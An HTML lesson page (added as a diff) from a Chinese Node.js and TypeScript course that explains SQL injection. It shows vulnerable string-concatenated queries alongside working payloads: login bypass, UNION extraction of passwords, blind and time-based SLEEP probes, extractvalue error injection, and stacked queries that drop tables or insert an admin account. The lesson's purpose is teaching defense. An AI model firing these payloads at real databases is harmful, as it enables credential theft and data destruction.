@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>93.1 SQL 注入原理 - Node.js + TypeScript 全栈开发课程</title>
+  <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+  <nav class="navbar">
+    <div class="navbar-brand">Node.js + TypeScript 全栈开发</div>
+    <ul class="navbar-nav">
+      <li><a href="../index.html">首页</a></li>
+      <li><a href="93-1-SQL注入原理.html">第九十三章</a></li>
+    </ul>
+  </nav>
+
+  <div class="container">
+    <header class="page-header">
+      <h1>93.1 SQL 注入原理</h1>
+      <p class="subtitle">数据库攻击深度解析</p>
+    </header>
+
+    <div class="content-block animate-fade-in-up">
+      <h2><span class="icon">🎯</span> 学习目标</h2>
+      <ul class="feature-list">
+        <li>深入理解 SQL 注入攻击原理</li>
+        <li>掌握常见注入方式</li>
+        <li>了解攻击的危害</li>
+        <li>学会识别注入漏洞</li>
+      </ul>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">📚</span> SQL 注入概述</h2>
+      <p>SQL 注入是一种代码注入技术，攻击者通过在输入中插入恶意 SQL 代码，操纵数据库执行非预期的操作。</p>
+      <div class="code-block">
+# SQL 注入定义
+将恶意 SQL 代码插入到应用程序的输入参数中
+使数据库执行攻击者意图的 SQL 命令
+
+# 攻击原理
+用户输入被直接拼接到 SQL 语句中
+改变了 SQL 的原始语义
+导致数据库执行非预期的操作
+
+# 注入类型
+
+## 按数据类型
+- 字符串注入
+- 数字注入
+- 布尔注入
+
+## 按注入方式
+- 联合查询注入 (UNION)
+- 布尔盲注
+- 时间盲注
+- 报错注入
+- 堆叠查询
+
+## 按攻击目标
+- 数据窃取
+- 数据篡改
+- 权限提升
+- 系统控制
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">🔧</span> 注入示例分析</h2>
+      <div class="code-block">
+# 场景：用户登录验证
+
+## 正常情况
+// 输入
+username: admin
+password: password123
+
+// SQL
+SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
+
+## SQL 注入攻击
+// 输入
+username: admin' --
+password: anything
+
+// 拼接后的 SQL
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
+
+// 实际执行
+SELECT * FROM users WHERE username = 'admin'
+-- 密码验证被注释掉，直接登录成功！
+
+# 场景：查询用户信息
+
+## 漏洞代码
+const userId = req.params.id;
+const sql = `SELECT * FROM users WHERE id = ${userId}`;
+db.query(sql);
+
+## 注入攻击
+// 输入
+id: 1 UNION SELECT username, password, null FROM users
+
+// 执行的 SQL
+SELECT * FROM users WHERE id = 1 UNION SELECT username, password, null FROM users
+
+# 场景：搜索功能
+
+## 漏洞代码
+const keyword = req.query.keyword;
+const sql = `SELECT * FROM products WHERE name LIKE '%${keyword}%'`;
+
+## 注入攻击
+// 输入
+keyword: %' OR '1'='1
+
+// 执行的 SQL
+SELECT * FROM products WHERE name LIKE '%%' OR '1'='1%'
+// 返回所有产品数据
+      </div>
+
+      <div class="tip-box warning">
+        <span class="icon">⚠️</span>
+        <div class="content">
+          <div class="title">危害严重</div>
+          <p>SQL 注入可能导致数据泄露、数据篡改、权限提升，甚至完全控制数据库服务器，是危害最大的 Web 漏洞之一。</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">⚙️</span> 常见注入技术</h2>
+      <div class="code-block">
+# 1. 联合查询注入 (UNION)
+// 获取列数
+' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,3,4,5 --
+
+// 窃取数据
+' UNION SELECT username, password, null FROM users --
+
+# 2. 布尔盲注
+// 条件为真返回正常结果
+' AND 1=1 --
+
+// 条件为假返回不同结果
+' AND 1=2 --
+
+// 逐字符猜测
+' AND SUBSTRING(password, 1, 1) = 'a' --
+
+# 3. 时间盲注
+// 条件为真时延迟
+' AND IF(1=1, SLEEP(5), 0) --
+
+// 猜测数据
+' AND IF(SUBSTRING(password, 1, 1) = 'a', SLEEP(5), 0) --
+
+# 4. 报错注入
+// 利用错误信息提取数据
+' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1))) --
+
+# 5. 堆叠查询
+// 执行多条 SQL
+'; DROP TABLE users; --
+'; INSERT INTO admin VALUES ('hacker', 'password'); --
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">🚀</span> 注入点识别</h2>
+      <div class="code-block">
+# 常见注入点
+
+## URL 参数
+/users?id=1
+/products?category=electronics
+
+## 表单输入
+登录表单、搜索框、注册表单
+
+## HTTP 头
+Cookie: session=xxx' --
+User-Agent: mozilla' --
+X-Forwarded-For: 127.0.0.1' --
+
+## Cookie 值
+userId=123' --
+
+# 识别方法
+
+## 1. 单引号测试
+输入: '
+如果报错，可能存在注入
+
+## 2. 布尔测试
+输入: 1 AND 1=1 (正常)
+输入: 1 AND 1=2 (异常)
+差异响应说明存在注入
+
+## 3. 时间测试
+输入: 1 AND SLEEP(5)
+响应延迟说明存在注入
+
+## 4. 算术运算
+数字注入测试
+输入: id=1 (正常)
+输入: id=2-1 (正常，说明可计算)
+输入: id=1 AND 1=1 (正常)
+
+# 自动化工具
+- SQLMap
+- Havij
+- Burp Suite SQL Injection Scanner
+      </div>
+    </div>
+
+    <div class="content-block">
+      <h2><span class="icon">📝</span> 本节小结</h2>
+      <div class="tip-box success">
+        <span class="icon">✅</span>
+        <div class="content">
+          <ul style="list-style: none; padding: 0;">
+            <li>• SQL 注入是最危险的 Web 漏洞之一</li>
+            <li>• 用户输入直接拼接 SQL 是根本原因</li>
+            <li>• 多种注入技术：联合查询、盲注、报错等</li>
+            <li>• 防护核心：参数化查询</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="chapter-nav">
+      <a href="../chapter92/92-5-双重Cookie验证.html">← 上一章：双重 Cookie 验证</a>
+      <a href="93-2-参数化查询.html">下一节：参数化查询 →</a>
+    </div>
+  </div>
+</body>
+</html>
